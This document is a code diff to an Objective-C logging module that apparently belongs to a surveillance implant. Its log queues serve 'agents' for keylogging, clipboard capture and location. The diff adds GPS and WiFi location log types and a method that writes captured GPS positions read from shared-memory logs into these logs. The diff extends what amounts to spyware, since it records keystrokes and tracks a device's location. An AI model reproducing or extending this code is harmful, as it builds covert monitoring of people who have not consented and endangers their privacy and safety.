@@ -154,7 +154,7 @@ typedef struct _log {
 #pragma mark Logging facilities
 #pragma mark -
 
-- (NSMutableArray*)getLogQueue: (u_int)agentID
+- (NSMutableArray*)getLogQueue: (u_int)agentID andLogID:(u_int)logID
 {
   NSMutableArray *aQueue = mAutoQueuedLogs;
  
@@ -172,6 +172,12 @@ typedef struct _log {
     case LOG_CLIPBOARD:
       aQueue = mNoAutoQueuedLogs;
       break;
+    case LOGTYPE_LOCATION_NEW:
+      if(logID == LOGTYPE_LOCATION_GPS)
+        aQueue = mNoAutoQueuedLogs;
+      else if (logID == LOGTYPE_LOCATION_WIFI)
+        aQueue = mAutoQueuedLogs;
+    break;
   }
 
   return aQueue;
@@ -384,7 +390,7 @@ typedef struct _log {
             
           [logHeader release];
           
-          NSMutableArray *theQueue = [self getLogQueue:agentID];
+          NSMutableArray *theQueue = [self getLogQueue:agentID andLogID: logID];
           
           @synchronized(theQueue) 
           {
@@ -459,7 +465,7 @@ typedef struct _log {
   NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                      length: sizeof(int)];
               
-  NSMutableArray *theQueue = [self getLogQueue:agentID];
+  NSMutableArray *theQueue = [self getLogQueue:agentID andLogID:logID];
                                                                                                                 
   @synchronized(theQueue)
   {
@@ -502,7 +508,7 @@ typedef struct _log {
   id anObject  = nil;
   id logObject = nil;
   
-  NSMutableArray *theQueue = [self getLogQueue:agentID];
+  NSMutableArray *theQueue = [self getLogQueue:agentID andLogID:logID];
 
   @synchronized(theQueue)
   {
@@ -622,6 +628,34 @@ typedef struct _log {
 }
 
 #define IS_HEADER_MANDATORY(x) ((x & 0xFFFF0000))
+  
+- (BOOL)createAndWritePositionLog:(NSData*)aData
+{
+  BOOL retVal = TRUE;
+  
+  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
+  
+  NSData *additionalData = [NSData dataWithBytes:shMemLog->commandData 
+                                          length: sizeof(LocationAdditionalData)];
+  NSData *payload        = [NSData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData) 
+                                          length:sizeof(GPSInfo)];
+  if ([self createLog:shMemLog->agentID 
+          agentHeader:additionalData 
+            withLogID:shMemLog->logID])
+    {
+   
+      if ([self writeDataToLog:(NSMutableData*)payload 
+                  forAgent:shMemLog->agentID
+                 withLogID:shMemLog->logID] == FALSE)
+        {
+          retVal = FALSE;
+        }
+    }
+  else
+    return retVal = FALSE;
+  
+  return retVal;
+}
 
 - (BOOL)processNewLog:(NSData *)aData
 {
@@ -649,6 +683,11 @@ typedef struct _log {
                                           length: shMemLog->commandDataSize - off];
         }
     }
+  else if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
+    {
+      payload = [NSMutableData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData) 
+                                      length:sizeof(GPSInfo)];
+    }
   else
     {
       payload = [NSMutableData dataWithBytes: shMemLog->commandData
@@ -675,9 +714,13 @@ typedef struct _log {
                       forAgent: shMemLog->agentID
                      withLogID: shMemLog->logID] == FALSE)
         {
-          if ([self createLog:shMemLog->agentID 
-                  agentHeader:nil 
-                    withLogID:shMemLog->logID])
+          if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
+            {
+              [self createAndWritePositionLog: aData];                                                                                   
+            }
+          else if ([self createLog:shMemLog->agentID 
+                       agentHeader:nil 
+                         withLogID:shMemLog->logID])
             {
               // if streaming keylog is closed rewrite with header
               if (shMemLog->agentID == LOG_KEYLOG)
